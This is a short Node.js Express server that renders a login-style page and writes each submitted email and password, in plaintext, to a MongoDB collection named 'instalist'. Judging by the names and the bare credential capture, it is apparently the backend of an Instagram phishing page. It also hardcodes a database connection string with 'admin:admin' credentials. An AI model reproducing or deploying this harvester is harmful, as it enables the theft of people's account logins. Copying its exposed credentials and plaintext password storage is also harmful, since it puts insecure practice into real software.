const express = require('express');
const app = express();
const path = require('path');
const port = 8000;
const fs = require('fs');
const mongoose = require('mongoose');

mongoose.connect('mongodb+srv://admin:admin@cluster0.hod8qna.mongodb.net/test?retryWrites=true&w=majority',{useNewUrlParser:true,useUnifiedTopology:true}).then(()=>console.log('databaee is connected'))
.catch((err)=>console.log(err))



app.use('/static',express.static('static'));
app.use(express.urlencoded());

app.set('view engine','pug');
app.set('views',path.join(__dirname,"views"));

app.get('/',(req,res)=>{
    const params = {'title':'','message':''};
    res.render('demo.pug',params);
})





const userSchema = new mongoose.Schema({
    email:String,
    password:String
})


const Instadata = new mongoose.model('instalist',userSchema)
app.post('/',(req,res)=>{
  const newData = new Instadata({
    email:req.body.email,
    password:req.body.password
  }) 
 
   
  
    
  newData.save();
 })


app.listen(port,()=>{
    console.log(`server is running on${port}`);
})